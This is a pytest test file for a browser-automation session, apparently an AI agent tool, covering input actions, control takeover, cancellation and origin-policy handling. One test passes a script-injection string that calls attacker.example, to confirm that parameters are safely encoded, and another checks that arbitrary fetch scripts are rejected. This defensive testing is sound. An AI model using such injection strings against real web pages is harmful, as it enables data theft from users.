"""
@file_name: test_actions.py
@author:
@date: 2026-09-23
@description: Fixed browser actions respect access, control and scope boundaries.
"""
import asyncio
import json

import pytest

from narranexus.platform.browser._browser_impl.policy import BrowserPolicy
from narranexus.platform.browser._browser_impl.session import BrowserSession


class Page:
    is_open = True

    def __init__(self):
        self.calls = []
        self.value = {"x": 12, "y": 24}

    async def call(self, method, params=None, **kwargs):
        self.calls.append((method, params))
        if method == "Runtime.evaluate":
            return {"result": {"value": "https://site.example/" if params["expression"] == "location.href" else self.value}}
        return {}


def setup(policy=None):
    page = Page()
    session = BrowserSession(cdp=page, policy=policy or BrowserPolicy(),
                             turn_id="t", thread_id="th", audit=lambda _: None)
    return session, page


@pytest.mark.asyncio
async def test_site_access_allows_fill_and_click_but_not_arbitrary_scripts():
    session, page = setup()
    assert (await session.act("fill", selector="#search", text="a search"))["outcome"] == "OK"
    assert (await session.act("click", selector="#submit"))["outcome"] == "OK"
    assert (await session.run_script("fetch('https://other.example')"))["outcome"] == "REJECTED"
    assert [p["type"] for m, p in page.calls if m == "Input.dispatchMouseEvent"] == ["mouseMoved", "mousePressed", "mouseReleased"]


@pytest.mark.asyncio
async def test_parameters_are_json_encoded_not_executable_fragments():
    session, page = setup()
    text = "'); fetch('https://attacker.example'); //"
    result = await session.act("fill", selector='input[name="q"]', text=text)
    assert result["outcome"] == "OK"
    expression = page.calls[-1][1]["expression"]
    assert json.dumps(text) in expression
    assert json.dumps('input[name="q"]') in expression


@pytest.mark.asyncio
@pytest.mark.parametrize("action,kwargs", [
    ("click", {"selector": "#go"}), ("fill", {"selector": "#q", "text": "query"}),
    ("select", {"selector": "#pick", "value": "one"}), ("press", {"key": "Enter"}),
    ("scroll", {"delta_y": 100}),
])
async def test_actions_ignore_legacy_origin_restrictions(action, kwargs):
    session, page = setup(BrowserPolicy.from_dict({"origins": {"https://site.example": {"access": "deny"}}}))
    assert (await session.act(action, **kwargs))["outcome"] == "OK"
    assert len(page.calls) > 1


@pytest.mark.asyncio
async def test_actions_wait_for_takeover_to_end():
    session, _ = setup()
    await session.take_control("panel")
    action = asyncio.create_task(session.act("click", x=5, y=6))
    await asyncio.sleep(0)
    assert not action.done()
    await session.release_control("panel")
    assert (await action)["outcome"] == "OK"


@pytest.mark.asyncio
async def test_press_supports_shortcuts_without_inserting_text():
    session, page = setup()
    assert (await session.act("press", selector="#q", key="Control+A"))["outcome"] == "OK"
    keys = [params for method, params in page.calls if method == "Input.dispatchKeyEvent"]
    assert [key["type"] for key in keys] == ["keyDown", "keyUp"]
    assert keys[0]["modifiers"] == 2
    assert not keys[0]["text"]


@pytest.mark.asyncio
async def test_scroll_forwards_only_numeric_wheel_parameters():
    session, page = setup()
    assert (await session.act("scroll", delta_x=5, delta_y=100))["outcome"] == "OK"
    assert page.calls[-1] == ("Input.dispatchMouseEvent", {
        "type": "mouseWheel", "x": 12, "y": 24, "deltaX": 5, "deltaY": 100, "modifiers": 0,
    })


@pytest.mark.asyncio
@pytest.mark.parametrize("action,kwargs", [
    ("evaluate", {"text": "1+1"}), ("fill", {"selector": "#q"}),
    ("click", {"x": float("nan"), "y": 1}), ("click", {}),
    ("select", {"selector": "#q", "value": {"script": "bad"}}),
    ("press", {"key": "invalid+key"}),
])
async def test_invalid_actions_never_reach_input_dispatch(action, kwargs):
    session, page = setup()
    assert (await session.act(action, **kwargs))["outcome"] == "ERROR"
    assert not any(method.startswith("Input.") for method, _ in page.calls)


@pytest.mark.asyncio
async def test_missing_or_disabled_elements_report_errors():
    session, page = setup()
    page.value = {"error": "Element is disabled"}
    result = await session.act("click", selector="#disabled")
    assert result["outcome"] == "ERROR"
    assert "disabled" in result["message"]
    assert not any(method.startswith("Input.") for method, _ in page.calls)


@pytest.mark.asyncio
@pytest.mark.parametrize("action,kwargs,method,event_type", [
    ("click", {"x": 5, "y": 6}, "Input.dispatchMouseEvent", "mouseReleased"),
    ("press", {"key": "Enter"}, "Input.dispatchKeyEvent", "keyUp"),
])
async def test_cancellation_releases_pressed_inputs(action, kwargs, method, event_type):
    session, page = setup()
    original = page.call
    pressed = asyncio.Event()

    async def blocked(command, params=None, **options):
        result = await original(command, params, **options)
        if command == method and params["type"] in ("mousePressed", "keyDown"):
            pressed.set()
            await asyncio.Future()
        return result

    page.call = blocked
    task = asyncio.create_task(session.act(action, **kwargs))
    await pressed.wait()
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task
    assert page.calls[-1][0] == method
    assert page.calls[-1][1]["type"] == event_type


@pytest.mark.asyncio
async def test_actions_keep_working_across_scopes_and_policy_changes():
    policy = BrowserPolicy.from_dict({"default_origin_policy": {"access": "ask"}})
    session, page = setup(policy)
    assert (await session.act("fill", selector="#q", text="first"))["outcome"] == "OK"
    session.bind_scope(turn_id="next", thread_id="th")
    assert (await session.act("fill", selector="#q", text="next"))["outcome"] == "OK"
    session._policy_provider = lambda: BrowserPolicy.from_dict({"default_origin_policy": {"access": "deny"}})
    session.bind_scope(turn_id="t", thread_id="th")
    assert (await session.act("click", selector="#go"))["outcome"] == "OK"
    assert any(method.startswith("Input.") for method, _ in page.calls)
